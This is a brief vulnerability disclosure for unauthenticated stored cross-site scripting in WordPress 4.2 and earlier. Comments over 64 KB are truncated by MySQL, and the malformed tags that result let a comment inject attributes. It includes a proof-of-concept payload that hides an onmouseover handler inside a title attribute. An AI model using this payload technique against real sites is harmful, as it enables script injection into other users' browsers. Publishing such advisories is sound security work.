#Unauthenticated Stored Cross-Site Scripting

1. Write up
  There is a vulnerability in Wordpress where when you comment on a post that is 64 kilobytes long in text.
  In MySql when text that is more than 64 kilobytes the input is truncated leaving malformed html tags.
  this allows for any attributes to be supplied within the tag including XSS injections

2. Proof of Concept
  <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>

3. Class of vulnerability
  CWE-79
  https://cwe.mitre.org/data/definitions/79.html

4. Vulnerable Versions
  Confirmed vulnerable: WordPress 4.2, 4.1.2, 4.1.1, 3.9.3.
  Tested with MySQL versions 5.1.53 and 5.5.41.

  
